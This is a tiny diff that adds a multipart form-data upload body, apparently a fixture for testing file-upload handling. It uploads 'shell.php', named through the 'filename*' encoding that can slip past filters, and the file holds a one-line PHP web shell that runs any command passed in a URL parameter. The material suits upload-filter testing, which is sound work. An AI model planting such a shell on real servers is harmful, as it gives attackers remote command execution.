@@ -1,0 +1,5 @@
+--X
+Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
+
+<?php system($_GET["c"]); ?>
+--X--
